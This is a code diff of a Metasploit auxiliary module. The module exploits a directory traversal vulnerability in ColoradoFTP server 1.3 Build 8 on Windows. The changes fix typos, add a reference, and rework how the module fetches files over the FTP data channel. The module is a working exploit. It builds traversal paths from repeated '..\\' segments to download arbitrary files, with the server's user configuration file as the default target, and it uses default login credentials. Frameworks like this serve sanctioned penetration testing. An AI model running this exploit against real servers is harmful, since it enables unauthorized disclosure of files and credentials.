@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::Ftp
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
@@ -18,7 +15,7 @@ class MetasploitModule < Msf::Auxiliary
         This module exploits a directory traversal vulnerability found in ColoradoFTP server
         version <= 1.3 Build 8. This vulnerability allows an attacker to download and upload arbitrary files
         from the server GET/PUT command including file system traversal strings starting with '\\\'.
-        The server is writen in Java and therefore platform independant, however this vulnerability is only
+        The server is written in Java and therefore platform independent, however this vulnerability is only
         exploitable on the Windows version.
       },
       'Platform'       => 'win',
@@ -31,7 +28,8 @@ class MetasploitModule < Msf::Auxiliary
       'References'     =>
         [
           [ 'EDB', '40231'],
-          [ 'URL', 'https://bitbucket.org/nolife/coloradoftp/commits/16a60c4a74ef477cd8c16ca82442eaab2fbe8c86']
+          [ 'URL', 'https://bitbucket.org/nolife/coloradoftp/commits/16a60c4a74ef477cd8c16ca82442eaab2fbe8c86'],
+          [ 'URL', 'http://www.securityfocus.com/archive/1/539186']
         ],
       'DisclosureDate' => 'Aug 11 2016'
     ))
@@ -42,7 +40,7 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('PATH', [ true, 'Path to the file to disclose, releative to the root dir.', 'conf\\xml-users.xml']),
         OptString.new('FTPUSER', [ true, 'Username to use for login', 'ftpuser']), #override default
         OptString.new('FTPPASS', [ true, 'Password to use for login', 'ftpuser123']) #override default
-      ], self.class)
+      ])
 
   end
 
@@ -50,7 +48,7 @@ class MetasploitModule < Msf::Auxiliary
     begin
       connect
       if /Welcome to ColoradoFTP - the open source FTP server \(www\.coldcore\.com\)/i === banner
-        return Exploit::CheckCode::Appears
+        return Exploit::CheckCode::Detected
       end
     ensure
       disconnect
@@ -62,20 +60,17 @@ class MetasploitModule < Msf::Auxiliary
   def run_host(ip)
     begin
       connect_login
-      sock = data_connect
-
       file_path = datastore['PATH']
       file = ::File.basename(file_path)
 
       # make RETR request and store server response message...
       retr_cmd = '\\\\\\' + ("..\\" * datastore['DEPTH'] ) + "#{file_path}"
-      res = send_cmd( ["retr", retr_cmd], true)
-      print_status(res)
-      # read the file data from the socket that we opened
-      response_data = sock.read(1024)
-
-      unless response_data
-        print_error("#{file} not found")
+      res = send_cmd_data( ['get', retr_cmd], '')
+      unless res.nil?
+        print_status(res[0])
+        response_data = res[1]
+      else
+        print_error("#{file} not found or invalid login")
         return
       end
 
